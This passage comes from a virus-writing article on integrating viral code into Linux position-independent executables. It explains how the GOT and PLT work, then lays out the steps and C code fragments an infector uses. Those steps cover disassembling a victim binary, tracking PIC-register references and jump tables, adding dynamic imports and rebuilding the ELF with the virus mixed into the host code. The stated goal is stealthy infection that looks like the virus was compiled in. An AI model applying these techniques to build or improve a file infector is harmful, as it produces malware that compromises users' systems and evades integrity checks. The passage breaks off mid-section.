@@ -1,0 +1,1716 @@
+Code integration on Linux: Cooking the PIE
+This is first rough draft. Questions, comments and bug reports are welcome herm1t@vx.netlux.org
+
+
+
+
+-Introduction-
+
+Since the advent of position-independent executables in Linux, the most interesting method of
+infection became possible - code integration [1], that is the  matter  in  question  in  this
+article. The irony of it is that PIE, ASLR and ExecShield was meant to  improve  security  of
+Linux applications, and at the same time it opened new opportunities for the  viruses.  While
+the prelink [2] complicate the files integrity checking.
+
+
+
+
+-PIC and PIE-
+
+PIC stands for Position Independent Code, that is the code  that  can  be  loaded  at  random
+address. Consider the following example:
+
+
+#include 
+
+int i = 1;
+
+static void foo(void)
+{
+}
+
+int main(int argc, char **argv)
+{
+	printf("Hello! i = %d, foo = %08x\n", i, (unsigned int)foo);
+	return 0;
+}
+
+
+And after compilation:
+
+08048370 <foo>:
+ 8048370:       55                      push   %ebp
+ 8048371:       89 e5                   mov    %esp,%ebp
+ 8048373:       c9                      leave  
+ 8048374:       c3                      ret    
+08048375 <main>:
+.........
+ 8048385:       83 ec 04                sub    $0x4,%esp
+ 8048388:       68 70 83 04 08          push   $0x8048370	; address of foo
+ 804838d:       ff 35 9c 95 04 08       pushl  0x804959c	; contents of i
+ 8048393:       68 7c 84 04 08          push   $0x804847c	; address of string "Hello..."
+ 8048398:       e8 13 ff ff ff          call   80482b0 <printf@plt>
+
+
+This code uses absolute addresses. One cannot do  anything  with  such  code, coming  on  the
+command push $0x8048370, we may only guess what is it? Address  or  constant? If  we  try  to
+insert something into this program or load it from another address, we will not  be  able  to
+adjust the addresses, thus the program will not work.
+
+The shared libraries is a horse of another colour. The  libraries  are  shared  between  many
+programs and they require the possibility to load the library from different  locations. This
+is the same problem, the virus authors could face. There are several ways  to  solve  it: one
+may keep the list of addresses, that should be fixed after load, relocs; or  it  is  possible
+to use the relative addressing. In many viruses one may find the addressing relative  to  the
+start of virus:
+
+
+virus_start:	...
+		call	L
+L:		pop	ebp
+		; ebp - address of L
+		sub	ebp, (L - virus_start)
+		; now in ebp - address of virus_start
+		...
+		; referrencing 'var' variable
+		lea	eax, [ebp + (var - virus_start)]
+		; (var - virus_start) - is the offset of variable
+		; from the virus start and ebp - the address of virus in memory
+		...
+var		db	'string',0
+
+
+The code generated with the -fpic switch is very similar to the above, but all addresses  are
+relative to the _GLOBAL_OFFSET_TABLE_ pointer. Let's look to  the  listing (gcc -fpic -pie -S
+-Wa,-alh):
+
+
+  27 0009 E800000000 		call	.L3
+  28              	.L3:
+  29 000e 5B       		popl	%ebx
+  30 000f 81C303000000 		addl	$_GLOBAL_OFFSET_TABLE_+[.-.L3], %ebx
+  31 0015 8D8300000000 		leal	foo@GOTOFF(%ebx), %eax
+  32 001b 50       		pushl	%eax
+  33 001c 8B8300000000 		movl	i@GOT(%ebx), %eax
+  34 0022 FF30     		pushl	(%eax)
+  35 0024 8D8300000000 		leal	.LC0@GOTOFF(%ebx), %eax
+  36 002a 50       		pushl	%eax
+  37 002b E8FCFFFF 		call	printf@PLT
+
+
+After compilation all these looks as follows:
+
+0000000e <.L3>:
+   e:   5b                      pop    %ebx
+   f:   81 c3 03 00 00 00       add    $0x3,%ebx
+                        11: R_386_GOTPC _GLOBAL_OFFSET_TABLE_
+  15:   8d 83 00 00 00 00       lea    0x0(%ebx),%eax
+                        17: R_386_GOTOFF        .text
+  1b:   50                      push   %eax
+  1c:   8b 83 00 00 00 00       mov    0x0(%ebx),%eax
+                        1e: R_386_GOT32 i
+  22:   ff 30                   pushl  (%eax)
+  24:   8d 83 00 00 00 00       lea    0x0(%ebx),%eax
+                        26: R_386_GOTOFF        .LC0
+  2a:   50                      push   %eax
+  2b:   e8 fc ff ff ff          call   2c <.L3+0x1e>
+                        2c: R_386_PLT32 printf
+
+R_* in object file are relocs itselves, the directives to the linker that  addresses  in  the
+executable files should be fixed. There will be no relocs in the executable for the code.
+
+
+.text
+000005fc <foo>:
+........
+00000601 <main>:
+........
+     605:   e8 00 00 00 00          call   60a <.L3>
+0000060a <.L3>:
+     60a:   5b                      pop    %ebx			; ebx = 0x60a
+     60b:   81 c3 1e 12 00 00       add    $0x121e,%ebx		; ebx = 0x1828 (_GLOBAL_OFFSET_TABLE_)
+     611:   8d 83 d4 ed ff ff       lea    0xffffedd4(%ebx),%eax; eax = 0x5fc (foo)
+     617:   50                      push   %eax
+     618:   8b 83 ec ff ff ff       mov    0xffffffec(%ebx),%eax; eax = [0x1814] = 0x184c (address of i)
+     61e:   ff 30                   pushl  (%eax)		; [esp] = 1 (value of i)
+     620:   8d 83 f0 ee ff ff       lea    0xffffeef0(%ebx),%eax; eax = 0x718 (address of format string in .rodata)
+     626:   50                      push   %eax
+     627:   e8 b0 fe ff ff          call   4dc <printf@plt>
+........		 
+.got
+00001814 <.got>:
+    1814:       4c 18 00 00	<- address of variable i
+    1818:       01 06 00 00	<- address of main
+.got.plt:
+00001828 <_GLOBAL_OFFSET_TABLE_>:
+.........
+.data
+0000184c <i>:
+    184c:       01 00 00 00
+
+
+Standard [3] requires that %ebx must be used as a PIC-register on x86, but  if  the  function
+references the global variable, but does not call any external functions, gcc may use another
+register:
+
+int a;
+main()
+{
+	a = 1;
+}
+$ gcc -Os -fpic -pie test.c
+$ objdump -d a.out |grep -A 4 'main>'
+ 000005c4 :
+  5c4:   e8 00 00 00 00          call   5c9 <main+0x5>
+  5c9:   59                      pop    %ecx
+  5ca:   81 c1 f3 11 00 00       add    $0x11f3,%ecx
+  5d0:   8b 81 f4 ff ff ff       mov    0xfffffff4(%ecx),%eax   
+
+
+PIE stands for position independent executable, it  can  be  built  with -fpic -pie switches.
+Broadly speaking, it is the library wich has the main function. 
+
+It's all well and good, but if we run the example, we can see that address of  foo()  is  not
+0x5fc:
+
+Hello! i = 1, foo = f6fff5fc
+
+The loader put the file not from zero, but  from  the  random  location  in  memory. How  the
+program will "know" the right addresses? The code itself does not require any  fixes, because
+all calculations are relative to address of _GOT_ and _GOT_ was got by  call 1f / 1: pop %ebx
+/ add $?,%ebx. And the loader will take  care  of  adjusting  the  addresses  stored  in GOT.
+The  file  has relocation table, located in  the .rel.dyn  section, you  may  check  it  with
+objdump -R:
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+00001814 R_386_RELATIVE    *ABS*	<- GOT[0] i@GOT
+00001818 R_386_RELATIVE    *ABS*	<- GOT[1] main@GOT
+........
+
+Addresses look familiar? The type R_386_RELATIVE means that you need to add the base  address
+to the value located at address OFFSET. Hence the program has no  relocs  for  the  code  and
+relocs for the data located in the .rel.dyn.
+
+To change the executable file we need to fix the numerous headers and tables, and  also  find
+all places in the code which calculate the value of _GOT_ and  all  commands  which  use  the
+_GOT_ to calculate the address.
+
+
+
+
+
+Lacrimae: the problems and a ways to solve them
+
+The task is "simple": one might wish that the infected file should look as if the  virus  was
+inserted yet before compilation. The virus to look like a program compiled  by  gcc. To  keep
+all trash like the instructions alignment on its places. And to avoid the  system  calls. And
+to use the global variables like a self-respecting human beings. PIE give us almost all  that
+is neccessary, namely, relocs for the data and a feasibility to restore the  relocs  for  the
+code.
+
+
+The sequence of operations:
+
+  1. Load the victim into memory 
+  2. Disassemble all code sections of the victim (.init, .text, .fini) 
+  3. Disassemble the virus (from the memory of the current process, all neccessary data might
+     be obtained from ELF header, PHT and DYNAMIC; the SHT is not available and we  will  not
+     bother to load it. There is an alternative - to save all neccessary values on the  stage
+     of infection (it's not the same with everybody). 
+  4. Step through the program (for both victim and virus)  from  entry  point, following  the
+     control flow and 
+        a. Mark the command as already "seen". Hereafter  all  commands  without  that  flags
+           could be removed. 
+        b. For all jump commands fill the "link" field (the point the command will jump to) 
+        c. Mark all commands calling the external functions, save the function name 
+        d. Mark all commands calculating the value of _GLOBAL_OFFSET_TABLE_ pointer 
+        e. Mark all commands using the obtained pointer for the access to code and data 
+        f. For the virus: mark all commands referencing data 
+  5. If virus lacks the imports, let's add them  by  extending .dynstr,.dynsym,.plt,.rel.plt,
+     .got.plt,.gnu_version 
+  6. Mix the victim and virus. It just the lists. It might be splited and joined as you like. 
+  7. Build the ELF file over again. Assemble the code. Copy  the  data  from  every  section.
+     Align it. Fix the headers. Fill the PHT and SHT. 
+  8. Now, then we knew the addresses of commands and data, link it: 
+        a. Fix the relocs in .rel.dyn 
+        b. Fix the PLT (.rel.plt and .got.plt) 
+        c. Fix the calls of external functions 
+        d. Fix the data references for virus and victim 
+        e. Fix the jump tables 
+        f. Fix DYNAMIC 
+        g. Fix the dynamic symbol table and .symtab (if present) 
+  9. All done. Write the result to the file. 
+
+
+
+
+Loading the victim
+
+The single question in this step is how to keep the data. I  arranged  it  as  the  array  of
+sections, in which each section described by structure:
+
+typedef struct t_section tsection;
+struct t_section {
+	Elf32_Shdr *ohdr;			// pointer to the header
+	uint32_t size, offset, addr, name;	// name is crc32 of name
+	uint8_t	*data;
+	code_t *code;				// will explain later
+	code_t **fast;				// for the quick access to code
+};
+
+
+To avoid the search every time one need ".text" (or anything else)  by  name  or  type, let's
+fill another array of pointers to tsection, in such way, that reference to the  ".text"  will
+look as sec[SI_TEXT]->data, where SI_TEXT is arbitrary index:
+
+enum {
+	SI_INIT,
+	SI_FINI,
+	SI_GOT,
+	...
+};
+
+For the fast search of the pairs (section_index, offset) for any  given  address, let's  save
+the index, upper and lower bound of section in the balanced binary tree. As far as  array  of
+sections is sorted by address in the ascending order, then after insertion we will anyway get
+the degenerated tree:
+
+
+1
+ \
+  2
+   \
+    3
+     \
+      4
+       .
+        .
+         .
+
+
+So the insertion routine can be simplified:
+
+Tree *insert(uint32_t index, uint32_t lo, uint32_t hi, Tree *root) {
+	Tree *new = NEW(Tree), *p;
+	new->index= index;
+	new->lo = lo;
+	new->hi = hi;
+	if (root == NULL)
+		return new;
+	p = root;
+	while (p->right != NULL)
+		p = p->right;
+	p->right = new;
+	return root;
+}
+// in load_elf
+	for (i = 0; i < shnum; i++) {
+		...
+		if (sections[i].addr > 0)
+			st = insert(i, sections[i].addr, sections[i].addr + sections[i].size, st);
+		...
+
+
+After that, call the balance and get the tree suitable for search:
+
+
+               12 lo=3210 hi=f1a0
+               / \
+              /   \
+             /     \
+            /       \
+      left /         \ right
+          /           \
+         /             \
+        /               \
+       /                 \
+      6 lo=18a6 hi=1a26  18 lo=12dac hi=12db0
+     / \                 / \
+    /   \               /   \
+   /     \             /     \
+  3       9           /       \
+ / \     / \         /         \
+1   4   7  10       15         21
+ \   \   \   \     / \         / \
+  2   5   8  11   /   \       /   \
+                 13   16     /     \
+                  \     \   19     23
+                  14    17   \     /
+                             20   22
+
+
+I borrow the balance from A. Anderson and the progy to draw the trees  from  D. Sleator  (the
+inventor of splay trees).
+
+The load_elf function is responsible for the file loading.
+
+
+
+
+
+Disassembler
+
+Disassembling function is almost the same as in Linux.Arches. Instead of length  disassembler
+I used more  powerful  engine  XDE32  (by Z0mbie). We'll  keep  the  code  in  the  following
+structures (surely, they lacks the nifty name like "struct HOOY", but it is good  enough, the
+more especially they are much simplier):
+
+typedef struct _code code_t;
+struct  _code {
+	uint16_t flags;
+	uint8_t al;		// alignment for this command, if (flags & FL_ALIGN)
+	uint8_t	*src;		// pointer to the command (to the process memory, victim mapping
+	union {			// or to the malloc'ed mameory (flags & FL_FREESRC)
+		uint32_t dsta;	// address in the new file
+		uint32_t asrc;	// if (flags & FL_ALIGN), then here is the offset
+	};
+	union {
+		uint32_t dref;	// if (flags & FL_DATA), then this is reference of the virus data
+		char *symbol;	// if (flags & FL_EXTERN), then this is pointer to the external function' name
+		code_t *link;	// if (diza.flags & C_REL), then this is pointer to the destination
+	};			// of jmp/call/jcc
+	code_t *next;		// next in the list
+	struct xde_instr diza;	// for disassembler
+};
+
+Flags:
+
+#define	FL_GOTPTR1	1	// command marked with one of these two flags calculate
+#define	FL_GOTPTR2	2	// the value of _GLOBAL_OFFSET_TABLE_
+#define	FL_DATA		4	// virus data reference
+#define	FL_GOTOFF	8	// code/data refernce in victim
+#define	FL_FREESRC	16	// don't forget free(c->src)
+#define	FL_EXTERN	32	// call external function
+#define	FL_ME		64	// I'm the virus!
+#define	FL_ALIGN	128	// I'm a padding!
+#define	FL_SEEN		256	// this is "alive" command (more about that later)
+
+Which are linked to the single-linked list, if one need to go through the list in the reverse
+direction (this will happen only once), will get along without prev, let's save some memory. 
+
+
+
+
+Searching through the code.
+
+Suppose, that we need the instruction with given address. To fill the link field, for example.
+Naive approach looks like:
+
+	FOR_EACH(code, c)
+		if (c->diza.flags & C_REL) {			// jmp/call/jcc/...
+			uint32_t jmp =				// destination
+					(c->src - m) +		// address of the jump command
+					c->diza.len +		// length
+					c->diza.data_l[0];	// argument
+			// look for the command with address jmp
+			FOR_EACH(code, d)
+				if (d->src - m == jmp) {
+					c->link = d;
+					break;
+				}
+			if (c->link == NULL)			// not found...
+				goto error;
+		}
+
+
+Is it simple. It is. But slow. We might have ten thousand commands in  the  list. Two  nested
+loops for search give the complexity N^2, where N is the  length  of  list. Instead  of  this
+let's do it like Mistfall did, perform a space/time  tradeoff, fill  the  array  of  pointers
+named fast for the virus and every section of victim, where the  index  is  the  offset  from
+the section start and values are the pointers to the code_t structures. In disassembler:
+
+                if ((c = NEW(code_t)) == NULL)
+                        return NULL;
+		...
+                fast[off - start] = c;
+
+
+Here is small picture to illustrate the above:
+
+sec[SI_TEXT] ---------> sections[12]:
+			Elf32_Shdr *ohdr ---------------------> shdr[12]
+			size = 13860				sh_size = 0x3624
+			offset = 0x300				sh_addr = 0x300
+			addr = 0x300				sh_offset = 0x300
+			name = 0xa21c1ea3 (crc32(".text"))	...
+                        code_t *code
+                             |         code_t **fast
+      mapping                |                    V
+0x300 | .text          |     V                    ...
+      ..................     * <----------------- fast[0x200]
+0x500 | B8 00 00 00 00 | <-- c->src               fast[0x201] = NULL
+                             c->diza.len = 5      fast[0x202] = NULL
+			     c->next              ...
+			     |
+			     V
+                             * <----------------- fast[0x205]
+0x505 | E8 01 00 00 00 | <-- c->src
+                             c->link----+
+			     c->next    |
+			     |          |
+			     V          |
+0x506 | 90             |     * <--------|-------- fast[0x206]
+                             ...        |
+0x507 |                |     * <--------+
+
+
+The search routine looks now as:
+
+			if (section_io_by_addr(&si, &so, jmp))
+				goto error;
+			...
+				if ((c->link = sections[si].fast[so]) == NULL)
+					goto error;
+			...
+
+section_io_by_addr return the index and offset from the begining of section for given address.
+Simple. And much faster. To find the wanted section, one may use BST:
+
+static int section_io_by_addr(uint32_t *si, uint32_t *so, uint32_t addr)
+{
+	Tree *tree;
+	for (tree = st;;)
+		if (tree->left && addr < tree->lo)
+			tree = tree->left;
+		else if (tree->right && addr >= tree->hi)
+			tree = tree->right;
+		else
+			break;
+	if (addr < tree->lo || addr > tree->hi)
+		return 1;
+	*si = tree->index;
+	*so = addr - tree->lo;
+	return 0;
+}
+
+There will be no more than five  iterations  for  thirty  sections. Will  save  here  several
+microseconds.
+
+
+
+
+
+Continue with disassembler
+
+Victim will be disassembled instruction by instruction  ignoring  the  jumps, while  for  the
+virus the disassemble will be called recursively on conditional jumps and function  calls.
+
+Compare the contents under current pointer with one of  the  fifteen  padding  patterns  that
+binutils is using for alignment (from one dimensional array padding bytes). If it matches, we
+will not call XDE and just fill the fields diza.len, asrc and flags.
+
+Add the command to the list, that is all for the victim, disassembler will  go  to  the  next
+command. If we disassemble the virus, then check is the current command is jump or not.
+
+
+
+
+
+Disassembling the virus
+
+Even before calling the disassemble() it is neccessary to find out several important  things:
+base address of the current process, virus  entry  point, pointers  to  the PLT, .dynsym  and
+.dynstr.
+
+Base address could be obtained in different ways, here are two of them:
+
+
+static uint8_t *get_base(void)
+{
+	uint8_t *self;
+	for (self = (uint8_t*)((uint32_t)&virus & ~(PAGE_SIZE - 1)); ; self -= PAGE_SIZE)
+		if (*((uint64_t*)self) == 0x10101464c457fULL)
+			break;
+	return self;
+}
+
+
+Instead of &virus any address which belongs to the current process might  be  used. Supposing
+that we changed the argument of the __libc_start_main and run instead of  main()  (it's easy)
+or imported the global variable environ (no big deal), so we may obtain the  pointer  to  PHT
+from aux vector:
+
+
+	Elf32_auxv_t *aux;
+	for (i=0; envp[i]; ++i)
+		;
+	for (aux = (Elf32_auxv_t*)(envp + i + 1); aux->a_type; aux++) {
+		if (aux->a_type == AT_PHDR) {
+			self = (uint8_t*)(aux->a_un.a_val & 0xfffff000);
+			break;
+		}
+	}
+	if ( *((uint32_t*)self) != 0x464c457f)
+		error("Failed to find base address...\n");
+
+
+Since the PHT in the infected (as well as in any normal) file  immediately  follows  the  ELF
+header, align it to the page boundary and obtain our base. Do we really need  this? We  shall
+manage with the first variant.
+
+
+Pointers to .dynsym, .dynstr and .rel.plt could be  obtained  from  the .dynamic, address  of
+.dynamic is a base address + p_vaddr from PHT entry with type  PT_DYNAMIC. Instead  we  could
+just save those values at the stage of infection, like I did:
+
+static code_t *disassemble_itself(void)
+{
+	...
+	self = get_base();
+	// we have RVAs, add the base address to get the absolute values
+	dynsym = (Elf32_Sym*)((uint32_t)dynsym + (uint32_t)self);
+	dynstr = (char*)((uint32_t)dynstr + (uint32_t)self);
+	relplt = (char*)((uint32_t)relplt + (uint32_t)self);
+	...
+static int fix_headers(uint8_t *file, code_t *centry, uint32_t *jt)
+{
+	...
+	// p is the pointer to the virus' "subsection" in .data section, virus - the first
+	// defined variable in virus
+	*(uint32_t*)(p + ((char*)&dynsym - (char*)&virus)) = sec[SI_DYNSYM]->addr;
+	*(uint32_t*)(p + ((char*)&dynstr - (char*)&virus)) = sec[SI_DYNSTR]->addr;
+	*(uint32_t*)(p + ((char*)&relplt - (char*)&virus)) = sec[SI_RELPLT]->addr;
+	...
+
+The same with the rest of neccessary data, like the offset of virus start  in  file. For  the
+zero generation it is neccessary to patch the .data of the virus, the  "patch"  utility  will
+do this.
+
+
+
+
+
+Analyzing the victim and itself
+
+Here is the key insight. We need to step through the all of the code, fill unfilled fields in
+the code_t structures, set the flags, find jump tables. All these done by mark() function.
+
+It is possible to look code from top downward (this works), but on the constructs similar  to
+the following (it seems that gcc does not produce such, but we will):
+
+
+foo.0:	...
+	mov	[ebx + quux@GOTOFF], eax
+	...
+	ret
+
+foo:	...
+	call	.L0
+.L0:	pop	ebx
+	add	ebx, .L0+1-_GLOBAL_OFFSET_TABLE_
+	...
+	jmp	foo.0
+
+
+we'll fail. For no other reason that the memory referense through  the  PIC-register  located
+below  (by  address, above  in  text)  than  PIC-register  initialization. Consequently,  not
+knowing the current PIC register we cannot recognize  the  memory  reference, don't  set  the
+flag, and finally don't fix the address, and will die an awful death  by segmentation  fault.
+We could have no such problem, if the program used the same PIC register  all  the  time, but
+as far as we knew that is not so. If the  function  does  not  call  the  PLT, but  uses  the
+variables, then compiler may use ecx instead of ebx as a PIC register.
+
+
+So this isn't good enough. Let's move behind the control transfer instructions:
+
+mark(...,code_t *code,int pic_reg,...)
+{
+	FOR_EACH(code, c) {
+restart:	if (c->flags & FL_SEEN)
+			return;			// we already being here
+		c->flags |= FL_SEEN;
+		// if we omit to do this, then we'll run rings round
+		// like those stupid KAV on "1: jmp 1b" instruction
+		...
+		// if c - ret/retn/hlt, then return
+		// if c - jmp, then
+			c = c->link; goto restart;
+		// if c - jcc, then mark(..., c->link, pic_reg, ...)
+		// if c - call, then mark(..., c->link, -1, ...)
+		...
+	}
+}
+
+
+There is also sweet side effect, now we knew that the code without FL_SEEN flag  could  never
+receive the control and can be removed without any doubts.
+
+
+
+
+
+Marking the commands for latter fixing
+
+Mark the code which stores the _GLOBAL_OFFSET_TABLE_ pointer in PIC-register:
+
+		if (c->diza.flag & C_REL) {
+			...
+			/* mark _GLOBAL_OFSET_TABLE_
+			a)	324c: call	3251
+				3251: pop	%ebx
+				3252: add	$0xfd8f,%ebx  
+			b)	321b: call	3242
+				3220: add	$0xfdc0,%ebx
+				....
+				3242: mov	(%esp),%ebx
+				3245: ret	*/
+			if (IS_CALL(c->src) && (c->flags & FL_EXTERN) == 0) {
+				code_t *d;
+				d = c->next->next;
+				/* a) */
+				if (d && c->link == c->next && IS_POP(c->next->src) && IS_ADD(d->src))
+					d->flags |= FL_GOTPTR1;
+				else
+				/* b) */
+				if (IS_DELTAINS(c->link->src) && IS_ADD(c->next->src))
+					c->next->flags |= FL_GOTPTR2;
+			}
+
+
+When we have such flag, then it is possible to mark the code  which  references  data.  Let's
+dissect two commands to see what's inside? 
+
+
+    lea 0xffffedd4(%ebx),%eax   mov 0xffffe168(%ebx,%eax,4),%eax     000 eax
+    8d 83 d4 ed ff ff           8b 84 83 68 e1 ff ff                 001 ecx
+   /   |  |                    /   |  | |                            010 edx
+opcode |  disp32         opcode    |  | disp32			     011 ebx
+       mod / r / m		   mod / r / m scale idx base        100 esp
+       10 000 011		    10 000 100    10 000 011         101 ebp
+       |                                                             110 esi
+       Second operand: Memory[disp32+Reg[M]]                         111 edi
+
+
+The conditions are quite obvious:
+
+		...
+		if (c->flags & (FL_GOTPTR1 | FL_GOTPTR2))
+			pic_reg = c->src[1] & 7;
+		...
+		if (pic_reg == -1)
+			continue;
+		/* GOT/GOTOFF */
+		if ((c->diza.flag & C_MODRM) == 0 || (c->diza.modrm & 0xc0) != 0x80)
+			continue;
+		if ((c->diza.modrm & 7) != pic_reg && ((c->diza.flag & C_SIB) == 0 || (c->diza.sib & 7) != pic_reg))
+			continue;
+		...
+			// _GLOBAL_OFFSET_TABLE_ + insn arg
+			off = got_end + *(uint32_t*)(c->src + c->diza.len - 4);		
+			// @GOTOFF or @GOT ?
+			if (off < got_start || off >= got_end)
+				c->flags |= FL_GOTOFF;
+
+
+
+
+
+Branch tables
+
+Suppose, that we write in program something like that:
+
+
+int foo(int a)
+{
+	switch (a) {
+		case 1: return 1;
+		case 2: return 3;
+		case 3: return 5;
+		case 4: return 7;
+		case 5: return 11;
+		case 6: return 13;
+	}
+	return 0;
+}
+int main(int argc, char **argv)
+{
+	foo(argc);
+}
+
+
+Do you think tha  compiler will generate something like cmp $1,%eax / je .case1 / cmp $2, %eax
+/ je .case2 / ...? Nothing of the kind. Offsets case1@GOTOFF, case2@GOTOFF, etc.  will  go  to
+.rodata, while jump will be performed through register:
+
+
+	call	.L11
+.L11:
+	popl	%ecx
+	addl	$_GLOBAL_OFFSET_TABLE_+[.-.L11], %ecx
+	xorl	%eax, %eax
+	cmpl	$5, %edx
+	ja	.L1
+	movl	.L9@GOTOFF(%ecx,%edx,4), %eax
+	addl	%ecx, %eax
+	jmp	*%eax
+	.section	.rodata
+.L9:
+	.long	.L3@GOTOFF
+	.long	.L4@GOTOFF
+	.long	.L5@GOTOFF
+	.long	.L6@GOTOFF
+	.long	.L7@GOTOFF
+	.long	.L8@GOTOFF
+	.text
+.L3:
+	movl	$1, %eax
+	jmp	.L1
+.L4:
+	movl	$3, %eax
+	jmp	.L1
+	...
+.L1:
+	leave
+	ret
+
+
+
+Consider the instruction in italics, the compiler inserted bounds checking code. We won't  be
+slow to take advantage of it. What should we do:
+
+   • If we found the command jmp *%jmp_reg 
+   • Walk through the list in the opposite direction, looking for mov label@GOTOFF(%pic_reg,...,4),%jmp_reg 
+   • Did we found it? We got the address of jump table and index register 
+   • Walk further through the list, looking for cmp imm, %index_reg 
+   • Did we found it? We got the size of the table 
+   • Save the address of each entry (not the entry itself) in the table for latter fixing 
+   • Having relative address (table entry), calculate the absolute one and call mark for it 
+
+
+To back walk through the list one might use the circular buffer:
+
+
+	FOR_EACH(code, c) {	
+		back[pb++, pb &= 15] = c;
+		...
+		if (IS_JMPREG(c->src)) {
+			...
+			uint32_t jmp_reg = c->src[1] & 7;
+			...
+			back[pb] = NULL;
+			for (pb--, pb &=15; ; ) {
+				// the buffer is only sixteen commands long...
+				if ((d = back[pb--, pb &= 15]) == NULL)
+					break;
+				// get the address (jtaddr) and save the index register in jmp_reg
+				if (jtaddr == 0) {
+					if ((d->diza.flag & C_SIB) && ((d->diza.sib & 199) == (128 | pic_reg)) &&
+					    (d->diza.flag & C_MODRM) && ((d->diza.modrm >> 3) & 7) == jmp_reg) { 
+						jtaddr = got_end + d->diza.addr_l[0];
+						jmp_reg = (d->diza.sib >> 3) & 7;
+					}
+				} else {
+					// we have address, let's look for table size (cmp insn)
+					if (jmp_reg == 0 && d->src[0] == 0x3d)
+						jtsize = d->diza.data_l[0];
+					else if ...
+					// we have the size, process the table
+					if (jtsize) {
+						// save the pointer to and mark each entry in the table
+						for (i = 0; i < jtsize; i++) {
+							jt[jt[0]++] = jtaddr + i*4;
+							/* does jt entry points to the code? no? we fail. */
+							if (mark_addr(got_end + *(uint32_t*)(base + jtaddr + i*4)))
+								return 1;
+						}
+						break;
+					}
+				}
+			}
+			...
+		}
+
+
+
+
+
+Virus and victim
+
+It is worthy of note that as opposed to the virus we run mark for the victim not only for the
+entry point, but for relocs from .rel.dyn also. The mark  calls  for  victim  and  virus  are
+located in functions disassemble_itself and disassemble_victim respectively.
+
+
+
+
+
+Adding missing imports
+
+Let's look what happens when the program running the command call printf@PLT.
+
+
+hello
+	.plt
+	000004bc
+	 4bc:   ff b3 04 00 00 00   +-> pushl  0x4(%ebx)
+	 4c2:   ff a3 08 00 00 00   |   jmp    *0x8(%ebx) ------+
+	 4c8:   00 00               |                           |
+	........                    5                           |
+	000004dc <printf@plt>:      |                           |
+	 4dc:	ff a3 10 00 00 00 +---> jmp    *0x10(%ebx) ------------+
+    +--> 4e2:	68 08 00 00 00    | | 	push   $0x8             |      |
+    |	 4e7:	e9 d0 ff ff ff    | +--	jmp    4bc              |      |
+    3	........                  1                             7      2
+    |	.text                     |                             |      |
+    |	........                  |                             |      |
+    |	 627:	e8 b0 fe ff ff    +---  call   4dc <printf@plt> |      |
+ +-----> 62c:	31 c0                	xor    %eax,%eax        |      |
+ |  |	........                                                |      |
+ 9  |	.got.plt                                                |      |
+ |  |	00001828 <_GLOBAL_OFFSET_TABLE_>:                       |      |
+ |  |	    1828:	4c 17 00 00	(.dynamic)              |      |
+ |  |	    182c:	00 00 00 00     (link_map)              |      |
+ |  |	+-- 1830:	00 00 00 00 <-- (resolver) -------------+      |
+ |  |	|   1834:	d2 04 00 00                                    |
+ |  +------ 1838:	e2 04 00 00 <-- (printf@plt + 6) <-------------+
+ |      |   183c:	f2 04 00 00
+ |	|    
+/lib/ld-linux.so.2
+ |	|
+ |	V
+ |      00520e80 <_dl_runtime_resolve>:
+ |	  520e80:       50                      push   %eax
+ |	  520e81:       51                      push   %ecx
+ |	  520e82:       52                      push   %edx
+ |	  520e83:       8b 54 24 10             mov    0x10(%esp),%edx
+ |	  520e87:       8b 44 24 0c             mov    0xc(%esp),%eax
+ |	  520e8b:       e8 b0 fd ff ff          call   520c40 <fixup>
+ |	  520e90:       5a                      pop    %edx
+ |	  520e91:       59                      pop    %ecx
+ |	  520e92:       87 04 24                xchg   %eax,(%esp)
+ |        520e95:       c2 08 00                ret    $0x8
+ |	                                        |  
+/lib/tls/libc.so.6                              8.c
+ |                                              |
+ +------- <printf> -----------------------------+
+
+
+
+  1. Program jumps to the address 0x4dc (printf@plt) 
+  2. Uncoditional jump to the address _GLOBAL_OFFSET_TABLE_[4] (each record in  PLT  has  the
+     corresponding record in .got.plt, fot the printf in this example the offset in  .got.plt
+     = 16 
+  3. The program returns to the next instruction in printf@plt 
+  4. The 0x8 pushed to the stack (the offset in the relocation table .rel.plt), the Elf32_Rel
+     structure occupies eight bytes, so it will be the first record: 
+
+
+     00001834  00000f07 R_386_JUMP_SLOT   00000000   __libc_start_main
+     00001838  00001007 R_386_JUMP_SLOT   00000000   printf
+
+
+     r_offset is the address in GOT, r_info holds the type R_386_JMP_SLOT (0x07) and index in
+     the dynamic symbol table .dynsym (0x10) = 16: 
+
+
+     16: 00000000    57 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
+
+
+  5. Jump to the beginning of .plt (jmp 4bc) 
+  6. The value of _GLOBAL_OFFSET_TABLE_[1] pushed to the stack (the pointer to  the  link_map
+     structure, undefined in file) 
+  7. Uncoditional  jump  to  the  address  stored  in _GLOBAL_OFFSET_TABLE_[2] (the  resolver
+     address, undefined in file) 
+  8. The dynamic linker supplied with that, will: 
+       a. Find the needed function 
+       b. Save the function' address to _GLOBAL_OFFSET_TABLE_[4] 
+       c. Clean the stack from its arguments and invoke the function 
+  9. The control returns to the program 
+
+
+The next time the program will invoke the printf the control will be immediately  transferred
+to the printf, because the loader already found and saved the address of printf  in .got.plt.
+As far as symbol resolving occurs on demand, this process is called lazy linking.
+
+You can find more details on fynamic linking in [4].
+
+
+
+
+
+Adding new functions
+
+If the function is already used by the program it is enough to find its helper address in the
+PLT, if not, we need to:
+
+
+   • Add the functions name to .dynstr (with trailing zero) 
+   • Add the .dynsym entry (Elf32_Sym) 
+     sym.st_name
+           name offset in .dynstr 
+     sym.st_info
+           ELF32_ST_INFO(STB_GLOBAL, STT_FUNC) 
+     sym.st_other
+           STV_DEFAULT 
+     The index of this entry is the size of .dynsym section / sizeof(Elf32_Sym) - 1 
+   • Add the record to the .rel.plt (Elf32_Rel) 
+     rel.r_info
+          ELF32_R_INFO(index, R_386_JMP_SLOT) 
+     rel.r_offset
+          address of pointer in GOT (still unknown) 
+   • Add four bytes to .got.plt 
+     [.got.plt + L0]
+            address of PLT record + 6 (still unknown)
+   • Add 16 bytes of code to the PLT (ff a3 L0:?? ?? ?? ?? 68 L1:?? ?? ?? ?? e9 L2:?? ?? ?? ??) 
+     L0
+          offset of the new entry in the .got.plt 
+     L1
+          offset of the new entry in the .rel.plt 
+     L2
+          -(16 + offset of the new entry in the .plt) 
+
+
+
+When all missing functions will be added it is neccessary to build the new .hash (how  to  do
+it and why it is neede see [5]).
+
+
+
+
+
+Looking for calls of external functions in the virus and the victim
+
+// in mark
+	if (is_virus == 0) {
+		...
